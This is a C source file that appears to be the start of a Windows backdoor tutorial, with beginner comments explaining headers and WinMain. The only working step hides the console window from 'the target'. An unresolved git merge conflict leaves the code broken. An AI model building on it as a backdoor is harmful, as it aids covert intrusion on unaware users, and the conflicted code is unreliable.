// Loading necessary libaries for backdoor
#include <stdio.h> //Allows to do basic input output functions
#include <stdlib.h> //Allows to do basic general purpose functions like malloc
#include <unistd.h> //Allows to do UNIX OS functions like file operations and process control.
#include <string.h> //Allows string manipulation functions (text)
#include <sys/stat.h> //Allows working with file information and process control
#include <sys/types.h> //Allows working with file information and process control

//Loading windows libaries
#include <winsock2.h> //Allows program to communicate over networks.
#include <windows.h> //Windows API header, provide access to machine core functions
#include <winuser.h> //Allows to create user interface in windows applications.
#include <wininet.h> //Allow program to do internet options like downloading and uploading.
#include <windowsx.h> //Allows to do extra macro functions to make windows program easier.

//Let's Start the main function
// This function is returning integer that why we specify int int the function.
//Reason to specify 'APIENTRY' Para is every windows program consist of an entry point.
//And it's also create API access to the program.
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
    //'HINSTANCE' - Used to handle an instance or a module(Executable) that was loaded in the memory.
    //hPrev -  Used in 16-bit windows now it's always 0.
    //Cmdline - UNICODE string act as an argument in the program.
    //CmdShow - A flag to represent minimized or maximized in the function.

<<<<<<< HEAD
    //Let's Program to make program execution invisible to the target while execution.
    HWND stealth;
    AllocConsole();//Allocate new console to the calling process.
    //below funtion handle windows top level window it take 2 parameters 1 is Class name 2 is Windows name it should be null.
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    //Reason - that we we want to show a windows to target or not.
    //It take 2 arguments. 1 one handle windows that we specify earlier.
    // 2nd arg - is 0 - Hiding the current window and activate another window.
    ShowWindow(stealth, 0);
}
=======
int main();
>>>>>>> 1882cb7300cb2707dfcf88b75ede0094ee519004
